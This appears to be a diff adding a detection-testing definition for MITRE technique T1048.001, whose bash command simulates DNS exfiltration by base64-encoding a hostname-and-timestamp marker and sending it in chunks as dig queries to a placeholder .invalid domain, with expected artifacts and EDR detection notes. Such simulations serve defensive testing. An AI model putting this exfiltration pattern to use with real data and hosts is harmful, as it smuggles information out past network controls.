@@ -1,0 +1,23 @@
+id: T1048.001
+name: "DNS Exfiltration"
+tactic: exfiltration
+technique: "Exfiltration Over Alternative Protocol: DNS"
+platforms: [linux]
+risk: medium
+description: "Simulates data exfiltration by encoding data in DNS query subdomains"
+tests:
+  - name: "DNS subdomain exfil simulation"
+    executor: bash
+    command: |
+      DATA=$(echo "halberd-exfil-test-$(hostname)-$(date +%s)" | base64 -w0 | tr '+/' '-_' | tr -d '=')
+      for CHUNK in $(echo "$DATA" | fold -w 60); do
+        dig +short +timeout=2 +tries=1 "${CHUNK}.exfil-test.invalid" A 2>/dev/null || true
+      done
+      echo "dns-exfil-simulation-complete"
+    cleanup: null
+    expected_artifacts:
+      - type: network
+        value: "DNS queries to *.exfil-test.invalid"
+      - type: process
+        value: "dig"
+    detection_notes: "EDR should detect high-entropy DNS subdomain queries and flag DNS tunneling patterns"
